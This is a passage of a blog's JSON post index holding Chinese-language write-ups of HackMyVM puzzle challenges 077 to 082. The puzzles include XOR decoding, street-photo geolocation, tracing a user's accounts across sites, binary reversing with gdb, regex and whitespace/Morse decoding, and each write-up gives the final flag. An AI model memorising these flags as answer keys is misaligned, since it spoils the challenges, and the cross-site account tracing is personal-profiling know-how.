26, 141, 118, 138, 130, 255, 5, 5, 103, 13, 108, 192, 138, 231]\n    numbers = [103, 198, 105, 115, 81, 255, 74, 236, 41, 205, 186, 171, 242, 251, 227, 70, 124, 194, 84, 248, 27, 232, 231, 141, 118, 90, 46, 99, 51, 159, 201, 154]\n    \n    flag = ''.join(chr(flag_ints[i] ^ numbers[i]) for i in range(32))\n    print(flag)\n\ncalc_flag()\n```\n\n\u8fd0\u884c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 a.py             \nHMV{Pseudo_RanD0m_Numbers_In__C}\n```\n\nsentence", "top": 0, "createdAt": 1754440413, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P164": {"htmlDir": "docs/post/Challenge 077.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 077", "postUrl": "post/Challenge%20077.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/164", "commentNum": 0, "wordCount": 3998, "description": "![image-20250727172730845](http://7r1UMPHK.github.io/image/20250727172731096.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 077.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 4255250 bytes (4156 KiB)\n\nExtracting archive: 077.zip\n--\nPath = 077.zip\nType = zip\nPhysical Size = 4255250\n\nEverything is Ok\n\nSize:       4283925\nCompressed: 4255250\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 8360\ndrwxr-xr-x 1 kali kali    4096  7\u670827\u65e5 05:28 .\ndrwxr-xr-x 1 kali kali   16384  7\u670826\u65e5 10:07 ..\n-rwxr-xr-x 1 kali kali 4255250  7\u670827\u65e5 05:27 077.zip\n-rwxr-xr-x 1 kali kali 4283925 2024\u5e74 7\u6708 5\u65e5 Building.jpg\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ exiftool Building.jpg \nExifTool Version Number         : 13.25\nFile Name                       : Building.jpg\nDirectory                       : .\nFile Size                       : 4.3 MB\nFile Modification Date/Time     : 2024:07:05 15:37:28-04:00\nFile Access Date/Time           : 2025:07:27 05:28:10-04:00\nFile Inode Change Date/Time     : 2024:07:05 15:37:28-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Little-endian (Intel, II)\nOrientation                     : Horizontal (normal)\nY Resolution                    : 72\nX Resolution                    : 72\nSoftware                        : MediaTek Camera Application\nImage Description               : \nY Cb Cr Positioning             : Co-sited\nExif Version                    : 0220\nExposure Compensation           : 0\nExposure Program                : Not Defined\nColor Space                     : sRGB\nMax Aperture Value              : 1.0\nExif Image Height               : 4096\nBrightness Value                : 9.6\nFlashpix Version                : 0100\nInteroperability Index          : R98 - DCF basic file (sRGB)\nRecommended Exposure Index      : 0\nExposure Mode                   : Auto\nExif Image Width                : 3072\nComponents Configuration        : Y, Cb, Cr, -\nDigital Zoom Ratio              : 1\nMetering Mode                   : Center-weighted average\nSensitivity Type                : Unknown\nScene Capture Type              : Standard\nLight Source                    : Other\nResolution Unit                 : inches\nCompression                     : JPEG (old-style)\nThumbnail Offset                : 616\nThumbnail Length                : 27648\nImage Width                     : 3072\nImage Height                    : 4096\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 3072x4096\nMegapixels                      : 12.6\nThumbnail Image                 : (Binary data 27648 bytes, use -b option to extract)\n```\n\n\u200b\tEXIF\u6570\u636e\u6ca1\u6709\u5305\u542b\u8857\u9053\u540d\u79f0\u7684\u5b57\u6bb5\n\n![Building](http://7r1UMPHK.github.io/image/20250727173525425.webp)\n\ngoogle\u4e00\u4e0b\n\nhttps://jp.123rf.com/photo_24186080_%E3%83%95%E3%83%A9%E3%83%B3%E3%82%B9-%E3%83%91%E3%83%AA%E3%81%AE%E5%85%B8%E5%9E%8B%E7%9A%84%E3%81%AA%E3%82%A2%E3%83%91%E3%83%BC%E3%83%88%E3%81%AE%E5%BB%BA%E7%89%A9.html\n\nhttps://www.flickr.com/photos/62139793@N03/5653696549/in/photostream/\n\n\u8499\u9a6c\u7279 \u5723\u5fc3\u5927\u6559\u5802\n\n\u6252\u62c9\u4e86\u5f88\u4e45\uff0c\u627e\u4e0d\u5230\uff0c\u53bbdiscord\u53d1\u73b0\u7eff\u8001\u54e5\u89e3\u8fc7\u4e86\n\nhttps://www.google.pl/maps/@48.887831,2.341695,3a,20.4y,17.44h,85.63t/data=!3m7!1e1!3m5!1sf_2fd7iAG1y1DnDGNPVqkQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D4.371506987724828%26panoid%3Df_2fd7iAG1y1DnDGNPVqkQ%26yaw%3D17.439427502100934!7i16384!8i8192?coh=205410&entry=ttu\n\n\u6284\u4e00\u4e0b\n\n````\nHMV{Rue_Saint-Vincent}\n````\n\nsentence", "top": 0, "createdAt": 1754440482, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P165": {"htmlDir": "docs/post/Challenge 078.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 078", "postUrl": "post/Challenge%20078.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/165", "commentNum": 0, "wordCount": 519, "description": "\u8fd9\u9898\u6211\u8bf4\u600e\u4e48\u8fd9\u4e48\u773c\u719f\uff0c\u8fd9\u4e0d\u6211\u8fdb\u7fa4\u89e3\u7684\u7b2c\u4e00\u9898\u5417\n![image-20250727223622608](http://7r1UMPHK.github.io/image/20250727223622837.webp)\n\n\u662f\u6709\u4e00\u4e2a\u7528\u6237\u53ebAlter\n\nhttps://hackmyvm.eu/profile/?user=Alter\n\n![img](https://hackmyvm.eu/img/u/Alter.jpg)\n\n\u4ed6\u5934\u50cf\u6709\u95ee\u9898\uff0c\u662fdiscord\u7684\u4e00\u4e2a\u7528\u6237\n\nhttps://discord.id/\n\n![](http://7r1UMPHK.github.io/image/20250806083618411.webp)\n\n\u53bbhmv\u7684discord\u6252\u62c9\u4e00\u4e0b\u4ed6\n![image-20250727224618346](http://7r1UMPHK.github.io/image/20250727224618491.webp)\n\n\u7136\u540e\u8fd9\u4e2a\u54e5\u4eec\u5728linkedin\uff0c\u6709\u4e2a\u53f7\n\nhttps://www.linkedin.com/in/alter-ego-003280321/\n\n```\nHMV{4lt3r_3g0s_d0nt_h1d3}\n```\n\nsentence", "top": 0, "createdAt": 1754440602, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P166": {"htmlDir": "docs/post/Challenge 079.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 079", "postUrl": "post/Challenge%20079.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/166", "commentNum": 0, "wordCount": 2734, "description": "![image-20250728104622420](http://7r1UMPHK.github.io/image/20250728104641252.webp)\n\n![image-20250728104649253](http://7r1UMPHK.github.io/image/20250728104649363.webp)\n\n\u53cd\u7f16\u8bd1\n\n```c\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  funkcja1(argc, argv, envp);\n  return 0;\n}\n\nint funkcja1()\n{\n  char s[32]; // [rsp+0h] [rbp-40h] BYREF\n  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF\n  int v3; // [rsp+30h] [rbp-10h]\n\n  v2[0] = 0xC5E4E0C3F9E0D0D4LL;\n  v2[1] = 0xE09AD8F7E4C0E1D3LL;\n  v3 = -1802251312;\n  policz_to(s, v2, string72);\n  return puts(s);\n}\n\n__int64 __fastcall policz_to(__int64 a1, __int64 a2, __int64 a3)\n{\n  __int64 result; // rax\n  int i; // [rsp+24h] [rbp-4h]\n\n  for ( i = 0; i <= 19; ++i )\n    *(_BYTE *)(i + a1) = ~(*(_BYTE *)(i + a3) ^ *(_BYTE *)(i + a2));\n  result = a1 + 20;\n  *(_BYTE *)(a1 + 20) = 0;\n  return result;\n}\n\n.data:0000000000407910 string72        db 'dIZQmPVTUttkFJ0SlZ81',0\n.data:0000000000407910                                         ; DATA XREF: funkcja1+37\u2191o\n```\n\n\u4ed6\u8fd9\u4e2a\u7a0b\u5e8f\u76f4\u63a5\u6267\u884c\u662f\u4f1a\u8f93\u51fa\u4e1c\u897f\u7684\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ./hmv-011       \nOfEWQOMnyjKpNmULCvTZ\n```\n\n\u4f46\u95ee\u9898\u662f\u8fd9\u4e2a\u4e0d\u662fflag\uff0c\u800c\u4e14\u6211\u6839\u636e\u4ed6\u7684tip\uff0c\u5c1d\u8bd5rev\u4e5f\u4e0d\u884c\n\n\u7136\u540e\u6211\u53bb\u4ed4\u7ec6\u89c2\u5bdf\u4e86\u4e00\u4e0bida\uff0c\u6211\u53d1\u73b0\u4ed6\u8fd8\u6709\u5f88\u591afunkcja\u7684\u51fd\u6570\uff0c1-100\n\n```c\nint funkcja2()\n{\n  char s[32]; // [rsp+0h] [rbp-40h] BYREF\n  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF\n  int v3; // [rsp+30h] [rbp-10h]\n\n  v2[0] = 0xD9CD87CFF6E48DECLL;\n  v2[1] = 0xEFC3BFD3FFEE83FELL;\n  v3 = -1044847680;\n  policz_to(s, v2, string9);\n  return puts(s);\n}\n```\n\n\u90a3\u76f4\u63a5\u5199\u4e2a\u811a\u672c\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ objdump -d ./hmv-011 | grep -A 10 '<main>:'\n0000000000403336 <main>:\n  403336:       f3 0f 1e fa             endbr64\n  40333a:       55                      push   %rbp\n  40333b:       48 89 e5                mov    %rsp,%rbp\n  40333e:       b8 00 00 00 00          mov    $0x0,%eax\n  403343:       e8 56 de ff ff          call   40119e <funkcja1>\n  403348:       b8 00 00 00 00          mov    $0x0,%eax\n  40334d:       5d                      pop    %rbp\n  40334e:       c3                      ret\n\nDisassembly of section .fini:\n```\n\n\u7f16\u5199\u811a\u672c\n\n```bash\n#!/bin/bash\n\nBIN='./hmv-011'\nADDR='*0x403343'\n\nfor i in $(seq 1 100); do\n    FN='funkcja${i}'\n    echo -n '[*] test: ${FN}'\n\n    OUT=$(gdb -q -batch \\\n        -ex 'b ${ADDR}' \\\n        -ex 'r' \\\n        -ex 'jump ${FN}' \\\n        -ex 'c' \\\n        --args ${BIN} 2>/dev/null)\n\n    if echo '$OUT' | grep -q 'HMV{'; then\n        echo -e '\\n\\n[+] Found: ${FN}'\n        echo '[!] FLAG: $(echo '$OUT' | grep -o 'HMV{[^}]*}')'\n        exit 0\n    else\n        echo -ne '\\r'\n    fi\ndone\n\necho '[-] Failed.'\n```\n\n\u6267\u884c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ bash a.sh\n[*] test: funkcja82\n\n[+] Found: funkcja82\n[!] FLAG: HMV{Is11task_hard??}\n```\n\nsentence", "top": 0, "createdAt": 1754440660, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P167": {"htmlDir": "docs/post/Challenge 080.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 080", "postUrl": "post/Challenge%20080.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/167", "commentNum": 0, "wordCount": 259, "description": "\u8fd9\u4e24\u5929\u914dIE\u7684X\u56ed\u533a\u914d\u7684\u60f3\u9f20\uff0cgithub\u8fd8\u6ca1\u6062\u590d\uff0c\u6253\u4e2achallenge\u51b7\u9759\u4e00\u4e0b\n\n![image-20250729212441389](http://7r1UMPHK.github.io/image/20250729212450348.webp)\n\n```\n(?![a-z])([VHM]{3})(?!\\w)(?P<Q>[\\{])R(?![\\d])(e)g\\3x(\\_{1})4\\4th\\3\\4(W)in(?P<H>\\x7d)$\n```\n\n\u770b\u7740\u50cf\u6b63\u5219\n\n```\nHMV{Regex_4_the_Win}\n```\n\nsentence", "top": 0, "createdAt": 1754440677, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P168": {"htmlDir": "docs/post/Challenge 081.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 081", "postUrl": "post/Challenge%20081.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/168", "commentNum": 0, "wordCount": 9007, "description": "![image-20250729212955995](http://7r1UMPHK.github.io/image/20250729212956244.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 081.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 1074 bytes (2 KiB)\n\nExtracting archive: 081.zip\n--\nPath = 081.zip\nType = zip\nPhysical Size = 1074\n\nEverything is Ok\n\nSize:       918\nCompressed: 1074\n                    \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat -A message.txt \n ^I   ^I  $\n  ^I^I    $\n ^I  ^I^I^I $\n ^I ^I ^I  $\n ^I ^I^I^I^I^I$\n ^I ^I ^I^I^I$\n  ^I^I    $\n ^I ^I  ^I $\n ^I ^I  ^I $\n ^I ^I^I  ^I$\n ^I ^I^I^I^I^I$\n ^I   ^I^I^I$\n ^I ^I ^I ^I$\n ^I ^I^I  ^I$\n  ^I^I ^I ^I$\n ^I ^I^I^I^I^I$\n$\n$\n$\n^I   $\n   ^I^I$\n  ^I^I ^I$\n^I   $\n    ^I$\n^I ^I $\n^I ^I$\n  ^I^I ^I$\n   $\n^I^I^I^I^I$\n^I^I^I^I^I$\n^I $\n^I ^I ^I^I$\n  ^I^I ^I$\n$\n$\n$\n   ^I   ^I^I^I$\n^I$\n      ^I^I    $\n^I$\n     ^I ^I ^I  $\n^I$\n     ^I ^I ^I  $\n^I$\n      ^I^I ^I  $\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I ^I ^I  $\n^I$\n      ^I^I ^I  $\n^I$\n     ^I  ^I ^I^I$\n^I$\n      ^I^I  ^I^I$\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I    ^I^I$\n^I$\n      ^I^I ^I  $\n^I$\n     ^I ^I  ^I $\n^I$\n      ^I^I  ^I^I$\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n      ^I^I    $\n^I$\n     ^I   ^I^I $\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I ^I  ^I^I$\n^I$\n      ^I^I    $\n^I$\n     ^I  ^I^I ^I$\n^I$\n     ^I   ^I ^I$\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I    ^I $\n^I$\n     ^I ^I ^I ^I$\n^I$\n      ^I^I ^I ^I$\n^I$\n      ^I^I   ^I$\n^I$\n     ^I  ^I^I^I $\n^I$\n      ^I^I  ^I^I$\n^I$\n      ^I^I ^I ^I$\n^I$\n      ^I^I ^I ^I$\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I     ^I$\n^I$\n     ^I ^I  ^I $\n^I$\n      ^I^I    $\n^I$\n     ^I ^I ^I ^I$\n^I$\n     ^I  ^I^I^I $\n^I$\n     ^I   ^I  $\n^I$\n     ^I ^I^I^I^I^I$\n^I$\n     ^I  ^I   $\n^I$\n      ^I^I  ^I^I$\n^I$\n     ^I ^I  ^I $\n^I$\n      ^I^I  ^I^I$\n^I$\n      ^I^I^I ^I $\n^I$\n      ^I ^I  ^I$\n^I$\n```\n\n\u770b\u7740\u50cf\u4e4b\u524d\u90a3\u4e2a\u7a7a\u767d\u52a0\u5bc6Whitespace\n\n\u7ed3\u679c\u4e0d\u662f.....\n\n```bash\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ hexdump -C message.txt\n00000000  20 09 20 20 20 09 20 20  0a 20 20 09 09 20 20 20  | .   .  .  ..   |\n00000010  20 0a 20 09 20 20 09 09  09 20 0a 20 09 20 09 20  | . .  ... . . . |\n00000020  09 20 20 0a 20 09 20 09  09 09 09 09 0a 20 09 20  |.  . . ...... . |\n00000030  09 20 09 09 09 0a 20 20  09 09 20 20 20 20 0a 20  |. ....  ..    . |\n00000040  09 20 09 20 20 09 20 0a  20 09 20 09 20 20 09 20  |. .  . . . .  . |\n00000050  0a 20 09 20 09 09 20 20  09 0a 20 09 20 09 09 09  |. . ..  .. . ...|\n00000060  09 09 0a 20 09 20 20 20  09 09 09 0a 20 09 20 09  |... .   .... . .|\n00000070  20 09 20 09 0a 20 09 20  09 09 20 20 09 0a 20 20  | . .. . ..  ..  |\n00000080  09 09 20 09 20 09 0a 20  09 20 09 09 09 09 09 0a  |.. . .. . ......|\n00000090  0a 0a 0a 09 20 20 20 0a  20 20 20 09 09 0a 20 20  |....   .   ...  |\n000000a0  09 09 20 09 0a 09 20 20  20 0a 20 20 20 20 09 0a  |.. ...   .    ..|\n000000b0  09 20 09 20 0a 09 20 09  0a 20 20 09 09 20 09 0a  |. . .. ..  .. ..|\n000000c0  20 20 20 0a 09 09 09 09  09 0a 09 09 09 09 09 0a  |   .............|\n000000d0  09 20 0a 09 20 09 20 09  09 0a 20 20 09 09 20 09  |. .. . ...  .. .|\n000000e0  0a 0a 0a 0a 20 20 20 09  20 20 20 09 09 09 0a 09  |....   .   .....|\n000000f0  0a 20 20 20 20 20 20 09  09 20 20 20 20 0a 09 0a  |.      ..    ...|\n00000100  20 20 20 20 20 09 20 09  20 09 20 20 0a 09 0a 20  |     . . .  ... |\n00000110  20 20 20 20 09 20 09 20  09 20 20 0a 09 0a 20 20  |    . . .  ...  |\n00000120  20 20 20 20 09 09 20 09  20 20 0a 09 0a 20 20 20  |    .. .  ...   |\n00000130  20 20 09 20 09 09 09 09  09 0a 09 0a 20 20 20 20  |  . ........    |\n00000140  20 09 20 09 20 09 20 20  0a 09 0a 20 20 20 20 20  | . . .  ...     |\n00000150  20 09 09 20 09 20 20 0a  09 0a 20 20 20 20 20 09  | .. .  ...     .|\n00000160  20 20 09 20 09 09 0a 09  0a 20 20 20 20 20 20 09  |  . .....      .|\n00000170  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|\n00000180  09 09 09 09 0a 09 0a 20  20 20 20 20 09 20 20 20  |.......     .   |\n00000190  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 20 09  | .....      .. .|\n000001a0  20 20 0a 09 0a 20 20 20  20 20 09 20 09 20 20 09  |  ...     . .  .|\n000001b0  20 0a 09 0a 20 20 20 20  20 20 09 09 20 20 09 09  | ...      ..  ..|\n000001c0  0a 09 0a 20 20 20 20 20  09 20 09 09 09 09 09 0a  |...     . ......|\n000001d0  09 0a 20 20 20 20 20 20  09 09 20 20 20 20 0a 09  |..      ..    ..|\n000001e0  0a 20 20 20 20 20 09 20  20 20 09 09 20 0a 09 0a  |.     .   .. ...|\n000001f0  20 20 20 20 20 09 20 09  09 09 09 09 0a 09 0a 20  |     . ........ |\n00000200  20 20 20 20 09 20 09 20  20 09 09 0a 09 0a 20 20  |    . .  .....  |\n00000210  20 20 20 20 09 09 20 20  20 20 0a 09 0a 20 20 20  |    ..    ...   |\n00000220  20 20 09 20 20 09 09 20  09 0a 09 0a 20 20 20 20  |  .  .. ....    |\n00000230  20 09 20 20 20 09 20 09  0a 09 0a 20 20 20 20 20  | .   . ....     |\n00000240  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|\n00000250  20 20 20 20 09 20 0a 09  0a 20 20 20 20 20 09 20  |    . ...     . |\n00000260  09 20 09 20 09 0a 09 0a  20 20 20 20 20 20 09 09  |. . ....      ..|\n00000270  20 09 20 09 0a 09 0a 20  20 20 20 20 20 09 09 20  | . ....      .. |\n00000280  20 20 09 0a 09 0a 20 20  20 20 20 09 20 20 09 09  |  ....     .  ..|\n00000290  09 20 0a 09 0a 20 20 20  20 20 20 09 09 20 20 09  |. ...      ..  .|\n000002a0  09 0a 09 0a 20 20 20 20  20 20 09 09 20 09 20 09  |....      .. . .|\n000002b0  0a 09 0a 20 20 20 20 20  20 09 09 20 09 20 09 0a  |...      .. . ..|\n000002c0  09 0a 20 20 20 20 20 09  20 09 09 09 09 09 0a 09  |..     . .......|\n000002d0  0a 20 20 20 20 20 09 20  20 20 20 20 09 0a 09 0a  |.     .     ....|\n000002e0  20 20 20 20 20 09 20 09  20 20 09 20 0a 09 0a 20  |     . .  . ... |\n000002f0  20 20 20 20 20 09 09 20  20 20 20 0a 09 0a 20 20  |     ..    ...  |\n00000300  20 20 20 09 20 09 20 09  20 09 0a 09 0a 20 20 20  |   . . . ....   |\n00000310  20 20 09 20 20 09 09 09  20 0a 09 0a 20 20 20 20  |  .  ... ...    |\n00000320  20 09 20 20 20 09 20 20  0a 09 0a 20 20 20 20 20  | .   .  ...     |\n00000330  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|\n00000340  20 20 09 20 20 20 0a 09  0a 20 20 20 20 20 20 09  |  .   ...      .|\n00000350  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|\n00000360  20 20 09 20 0a 09 0a 20  20 20 20 20 20 09 09 20  |  . ...      .. |\n00000370  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 09 20  | .....      ... |\n00000380  09 20 0a 09 0a 20 20 20  20 20 20 09 20 09 20 20  |. ...      . .  |\n00000390  09 0a 09 0a 20 20                                 |....  |\n00000396\n```\n\n\u770b\u7740\u6709\u70b9\u89c4\u5f8b\n```bash\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat message.txt | tr ' \\t' '01'  \n01000100\n00110000\n01001110\n01010100\n01011111\n01010111\n00110000\n01010010\n01010010\n01011001\n01011111\n01000111\n01010101\n01011001\n00110101\n01011111\n\n\n\n1000\n00011\n001101\n1000\n00001\n1010\n101\n001101\n000\n11111\n11111\n10\n101011\n001101\n\n\n\n0001000111\n1\n000000110000\n1\n000001010100\n1\n000001010100\n1\n000000110100\n1\n000001011111\n1\n000001010100\n1\n000000110100\n1\n000001001011\n1\n000000110011\n1\n000001011111\n1\n000001000011\n1\n000000110100\n1\n000001010010\n1\n000000110011\n1\n000001011111\n1\n000000110000\n1\n000001000110\n1\n000001011111\n1\n000001010011\n1\n000000110000\n1\n000001001101\n1\n000001000101\n1\n000001011111\n1\n000001000010\n1\n000001010101\n1\n000000110101\n1\n000000110001\n1\n000001001110\n1\n000000110011\n1\n000000110101\n1\n000000110101\n1\n000001011111\n1\n000001000001\n1\n000001010010\n1\n000000110000\n1\n000001010101\n1\n000001001110\n1\n000001000100\n1\n000001011111\n1\n000001001000\n1\n000000110011\n1\n000001010010\n1\n000000110011\n1\n000000111010\n1\n000000101001\n1\n00\n```\n\nhttps://gchq.github.io/CyberChef/\n\n![image-20250729214536810](http://7r1UMPHK.github.io/image/20250729214537116.webp)\n\n\u7b2c\u4e00\u6bb5\n\n```bash\nD0NT_W0RRY_GUY5_\n```\n\n\u7136\u540e\u4e2d\u95f4\u8fd9\u6bb5\u7eaf\u8111\u6d1e\uff0c\u662f\u83ab\u65af\u5bc6\u7801\n\n```bash\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat mosi|sed 's/1/-/g; s/0/./g'                                                                                                       \n-...\n...--\n..--.-\n-...\n....-\n-.-.\n-.-\n..--.-\n...\n-----\n-----\n-.\n-.-.--\n..--.-\n```\n\nhttps://morsecodetranslator.com/\n\n```bash\nB3_B4CK_S00N!_\n```\n\n\u540e\u9762\u7684\u6252\u62c9\u4e86\u534a\u5929\uff0c\u7ed3\u679c\u53d1\u73b0\u662f\u8f6c\u6362\u7684\u95ee\u9898\n\n```bash\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ tail -n +35 message.txt | tr '$ \\t' '001' | grep -v '^1$\\|^$' | sed 's/^0000//' | sed 's/.*\\(.\\{8\\}\\)$/\\1/'\n01000111\n00110000\n01010100\n01010100\n00110100\n01011111\n01010100\n00110100\n01001011\n00110011\n01011111\n01000011\n00110100\n01010010\n00110011\n01011111\n00110000\n01000110\n01011111\n01010011\n00110000\n01001101\n01000101\n01011111\n01000010\n01010101\n00110101\n00110001\n01001110\n00110011\n00110101\n00110101\n01011111\n01000001\n01010010\n00110000\n01010101\n01001110\n01000100\n01011111\n01001000\n00110011\n01010010\n00110011\n00111010\n00101001\n00\n```\n\n![image-20250729222525237](http://7r1UMPHK.github.io/image/20250729222525532.webp)\n\n```bash\nG0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)\n```\n\n\u62fc\u63a5\n\n```bash\nD0NT_W0RRY_GUY5_B3_B4CK_S00N!_G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)\n```\n\n\u4e0d\u7528\u52a0HMV\u76f4\u63a5\u63d0\u4ea4sentence", "top": 0, "createdAt": 1754440721, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P169": {"htmlDir": "docs/post/Challenge 082.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 082", "postUrl": "post/Challenge%20082.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/169", "commentNum": 0, "wordCount": 2145, "description": "![image-20250803000325430](http://7r1UMPHK.github.io/image/20250803000325640.webp)\n\n# 1. \u521d\u6b65\u5206\u6790\u4e0e\u4fe1\u606f\u83b7\u53d6\n\n\u9996\u5148\uff0c\u6211\u4eec\u62ff\u5230\u4e86\u4e00\u4e2a\u540d\u4e3a `082.zip` \u7684\u538b\u7f29\u6587\u4ef6\u3002\u901a\u8fc7 `7z` \u547d\u4ee4\u89e3\u538b\u540e\uff0c\u5f97\u5230\u4e00\u4e2a `082.bin` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 082.zip -o82\n...\nEverything is Ok\n```\n\n\u4f7f\u7528 `file` \u548c `ls -al` \u67e5\u770b\u6587\u4ef6\u4fe1\u606f\uff0c\u786e\u8ba4\u5b83\u662f\u4e00\u4e2a\u5927\u5c0f\u4ec5\u4e3a 61 \u5b57\u8282\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/82]\n\u2514\u2500$ file 082.bin\n082.bin: data\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/82]\n\u2514\u2500$ ls -al\n-rwxr-xr-x 1 kali kali   61 2024\u5e74 4\u670819\u65e5 082.bin\n```\n\n\u76f4\u63a5 `cat` 